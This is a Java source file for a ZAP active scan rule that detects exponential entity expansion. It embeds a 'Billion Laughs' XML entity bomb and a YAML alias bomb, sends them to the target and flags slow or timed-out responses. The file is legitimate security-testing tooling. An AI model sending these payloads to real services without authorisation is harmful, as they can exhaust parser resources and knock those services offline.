/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2022 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrulesAlpha;

import java.io.IOException;
import java.net.SocketTimeoutException;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractAppPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.addon.commonlib.CommonAlertTag;

public class ExponentialEntityExpansionScanRule extends AbstractAppPlugin {

    private static final Logger LOGGER =
            LogManager.getLogger(ExponentialEntityExpansionScanRule.class);
    private static final String PREFIX = "ascanalpha.entityExpansion.";
    private static final long MIN_TIME_ELAPSED_MILLIS = TimeUnit.SECONDS.toMillis(10);
    static final String XML_PAYLOAD =
            "<?xml version=\"1.0\"?>\n"
                    + "<!DOCTYPE lolz [\n"
                    + " <!ENTITY lol \"lol\">\n"
                    + " <!ELEMENT lolz (#PCDATA)>\n"
                    + " <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n"
                    + " <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n"
                    + " <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n"
                    + " <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n"
                    + " <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n"
                    + " <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n"
                    + " <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n"
                    + " <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n"
                    + " <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n"
                    + "]>\n"
                    + "<lolz>&lol9;</lolz>";
    static final String YAML_PAYLOAD =
            "a: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]\n"
                    + "b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]\n"
                    + "c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]\n"
                    + "d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]\n"
                    + "e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]\n"
                    + "f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]\n"
                    + "g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]\n"
                    + "h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]\n"
                    + "i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]";

    @Override
    public int getId() {
        return 40044;
    }

    @Override
    public String getName() {
        return Constant.messages.getString(PREFIX + "name");
    }

    @Override
    public String getDescription() {
        return Constant.messages.getString(PREFIX + "desc");
    }

    @Override
    public int getCategory() {
        return Category.MISC;
    }

    @Override
    public String getSolution() {
        return Constant.messages.getString(PREFIX + "soln");
    }

    @Override
    public String getReference() {
        return Constant.messages.getString(PREFIX + "refs");
    }

    @Override
    public int getRisk() {
        return Alert.RISK_MEDIUM;
    }

    @Override
    public Map<String, String> getAlertTags() {
        return CommonAlertTag.toMap(
                CommonAlertTag.OWASP_2021_A04_INSECURE_DESIGN,
                CommonAlertTag.WSTG_V42_BUSL_09_UPLOAD_MALICIOUS_FILES);
    }

    @Override
    public int getCweId() {
        return 776;
    }

    @Override
    public int getWascId() {
        return 44;
    }

    @Override
    public List<Alert> getExampleAlerts() {
        return Collections.singletonList(newAlert().setConfidence(Alert.CONFIDENCE_LOW).build());
    }

    @Override
    public void scan() {
        String attack;
        if (getBaseMsg().getRequestHeader().hasContentType("xml")) {
            attack = XML_PAYLOAD;
        } else if (getBaseMsg().getRequestHeader().hasContentType("yml", "yaml")) {
            attack = YAML_PAYLOAD;
        } else {
            return;
        }
        HttpMessage msg = getNewMsg();
        msg.setRequestBody(attack);
        boolean socketTimeout = false;
        try {
            sendAndReceive(msg);
        } catch (SocketTimeoutException e) {
            socketTimeout = true;
            LOGGER.debug("The exponential entity expansion query timed out.");
        } catch (IOException e) {
            LOGGER.warn(e.getMessage(), e);
            return;
        }
        if (socketTimeout || msg.getTimeElapsedMillis() > MIN_TIME_ELAPSED_MILLIS) {
            newAlert()
                    .setAttack(attack)
                    .setConfidence(Alert.CONFIDENCE_LOW)
                    .setMessage(msg)
                    .setOtherInfo(
                            Constant.messages.getString(
                                    PREFIX + "other",
                                    TimeUnit.SECONDS.convert(
                                            msg.getTimeElapsedMillis(), TimeUnit.MILLISECONDS)))
                    .raise();
        }
    }
}
